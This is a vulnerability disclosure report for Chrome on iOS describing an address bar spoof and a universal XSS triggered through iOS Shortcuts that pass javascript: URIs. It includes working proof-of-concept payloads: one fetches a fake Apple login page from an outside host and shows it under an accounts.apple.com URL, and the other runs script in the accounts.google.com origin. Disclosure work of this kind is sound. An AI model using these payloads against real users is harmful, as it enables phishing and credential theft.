# Title: Address Bar Spoof and UXSS Using Shortcuts Chrome iOS

## Description: 
Steps to reproduce the problem
Address Bar Spoof

Open https://www.icloud.com/shortcuts/c56f077c3b9d4d168d93aaf0d0defa65 and Add to Shortcuts
Run the Shortcut
Address bar spoofed to accounts.apple.com
UXSS

Open https://www.icloud.com/shortcuts/828872b70e3246d68b818c5a9234802b and Add to Shortcuts
Run the Shortcuts
Type your age in the address bar when asked
XSS on accounts.google.com
Video POCs attached

Problem Description
Chrome has a feature to open URLs using shortcuts but not only URLs we can also use Text to be passed to Chrome this won't be checked by the internal URL parser and anything can be sent, also Chrome doesn't check the protocol of the URL which we can insert javascript: URI and when opened inside the browser Chrome will execute the JS URI and shows end of the URL meaning javascript:document.write('spoof')//........google.com/login will be shown as ...google.com/login and with the page content being spoof.

Also this can lead to UXSS since chrome allows top navigation to javascript: URI and since our current url is javascript: we just need the user to tap the address bar and change something from it and in background we will redirect to google.com when the user press enter our code will be executed in context of google.com

Address bar POC code: Text -> Chrome -> Open Text
javascript:fetch('https://pwr.wtf/fakeapple.php').then(r=>{r.text().then(w=>{document.write(w)})});alert(origin)
//accounts.apple.com/login?oauth=1&a///
UXSS POC Code Text -> Chrome -> Open Text

javascript:"Age_(_______)";document.write(`<meta name="viewport" content="width=device-width, user-scalable=no"><center><h2 style=font-size:50px>origin: ${origin}<br><br><br>Type your age in the address bar to enter`);setTimeout(()=>{if(location.hash!='#xss'){document.write('<script>location="https://xss:slaw@accounts.google.com/#xss";</script>')} else {alert('UXSS POC: '+origin);}},7000);//Type_Birthday_Here_My_Age_is_(_______)
Summary
Address Bar Spoof and UXSS Using Shortcuts


## Affected Browser(s): Chrome iOS

## Severity: Low

## Spoof Type: End-of-URL-Shown

## POC Photo/Video: bug-071.mp4/.mov/.png

## Discovery Date: 2024-12-09

